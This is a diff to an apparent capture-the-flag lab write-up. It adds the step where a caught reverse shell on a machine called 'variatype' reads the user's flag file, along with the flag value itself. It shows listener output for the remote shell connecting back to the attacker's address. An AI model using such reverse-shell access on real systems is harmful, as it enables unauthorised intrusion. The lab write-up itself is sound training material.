@@ -1947,8 +1947,12 @@ listening on [any] 4445 ...
 connect to [10.10.14.71] from (UNKNOWN) [10.129.15.219] 35946
 bash: cannot set terminal process group (5724): Inappropriate ioctl for device
 bash: no job control in this shell
-steve@variatype:/tmp/ffarchive-5725-1$ 
+steve@variatype:/tmp/ffarchive-5725-1$ cat /home/steve/user.txt
+cat /home/steve/user.txt
+10d6319b7fb72f3e6a5f0792adb58d10
 ```
+
+**User Flag:** ==`10d6319b7fb72f3e6a5f0792adb58d10`==
 <div align="center">
 <br>
 <br>
